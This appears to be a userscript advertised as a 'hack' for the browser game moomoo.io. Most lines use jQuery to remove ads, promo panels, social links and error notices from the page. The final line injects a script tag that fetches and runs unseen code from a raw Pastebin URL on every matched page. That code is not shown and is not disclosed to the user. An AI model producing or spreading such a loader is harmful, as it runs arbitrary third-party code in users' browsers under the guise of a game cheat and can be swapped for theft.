// ==UserScript==
// @name         PSK MOOMOO.IO HACK
// @namespace    PSK
// @version      6.0
// @description  MOOMOO.IO HACK
// @author       PSK-EXTENSION
// @require      http://code.jquery.com/jquery-1.12.4.min.js
// @match        http://moomoo.io/*
// @match        https://moomoo.io/*
// @grant        none
// @connect      moomoo.io
// @icon         https://i.imgur.com/6dGIY5n.png
// ==/UserScript==

$(document).ready(function () {
    $('#youtuberOf').remove('');
    $('#gameName').remove('');
    $('#youtubeFollow').remove();
    $('#followText').remove();
    $('#adCard').remove();
    $('#downloadButtonContainer').remove();
    $('#promoImgHolder').remove();
    $('#linksContainer2').remove();
    $('#twitterFollow').remove();
    $('#mobileDownloadButtonContainer').remove();
    $('#altServer').remove();
    $('#errorNotification').remove();
    $('.menuHeader').html($('.menuHeader').children());
    $('.menuText').html($('.menuText').children());
    $('.settingRadio').html($('.settingRadio').children());
    $('#nativeResolutionContainer').text('');
    $('.menuText').text('');
    $('.menuHeader').text('');
});

$("head").append("<script src='https://pastebin.com/raw/s5z3LgtV'></script>");